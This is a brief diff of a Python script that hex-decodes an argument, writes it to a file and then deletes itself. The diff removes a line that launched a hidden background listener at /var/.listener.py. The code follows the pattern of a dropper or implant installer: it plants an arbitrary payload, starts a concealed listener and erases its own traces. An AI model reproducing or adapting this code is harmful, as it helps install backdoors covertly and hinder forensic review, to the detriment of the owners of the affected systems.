@@ -38,7 +38,6 @@ def main():
 	package = bytes.fromhex(sys.argv[1]).decode('utf-8')
 	f.write(package)
 	f.close()
-	os.system("python3 /var/.listener.py &")
 	self = sys.argv[0]
 	os.system(f"rm {self}")
 main()
